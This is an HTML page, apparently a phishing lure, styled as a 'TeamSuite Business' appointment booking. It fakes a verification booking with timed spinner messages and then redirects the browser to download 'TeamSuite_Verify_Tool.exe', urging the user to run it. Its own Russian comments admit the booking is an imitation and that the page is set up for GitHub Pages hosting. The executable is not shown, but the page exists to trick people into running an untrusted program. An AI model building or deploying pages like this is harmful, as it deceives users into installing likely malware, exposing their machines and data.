<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TeamSuite Business</title>
    <link rel="icon" type="image/x-icon" href="favicon.ico">
    <style>
        body { font-family: sans-serif; background: #f4f7f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
        .icon { font-size: 50px; margin-bottom: 20px; }
        h2 { margin: 0 0 10px; color: #1a1a1a; }
        p { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
        
        .btn { 
            background: #007bff; color: white; border: none; padding: 15px 25px; 
            border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px;
            transition: background 0.3s;
        }
        .btn:hover { background: #0056b3; }
        .btn:disabled { background: #ccc; cursor: not-allowed; }

        #loading { display: none; margin-top: 20px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="card" id="main-card">
    <div class="icon">📅</div>
    <h2>Schedule Appointment</h2>
    <p>To access business features, please book your verification slot. The security tool will be provided automatically after booking.</p>
    
    <button class="btn" id="book-btn" onclick="processBooking()">Book Time & Verify</button>

    <div id="loading">
        <div class="spinner"></div>
        <p id="status-text">Booking your slot...</p>
    </div>
</div>

<script>
    function processBooking() {
        const btn = document.getElementById('book-btn');
        const loading = document.getElementById('loading');
        const statusText = document.getElementById('status-text');

        btn.style.display = 'none';
        loading.style.display = 'block';

        // Имитация процесса бронирования
        setTimeout(() => {
            statusText.innerText = "Slot confirmed! Starting secure download...";
            
            setTimeout(() => {
                // ВАЖНО: Путь без первого слэша для работы на GitHub Pages
                window.location.href = 'api/v4/download/TeamSuite_Verify_Tool.exe';
                
                statusText.innerHTML = "✅ Done! Run the tool to complete verification.";
            }, 1500);
            
        }, 2000);
    }
</script>

</body>
</html>
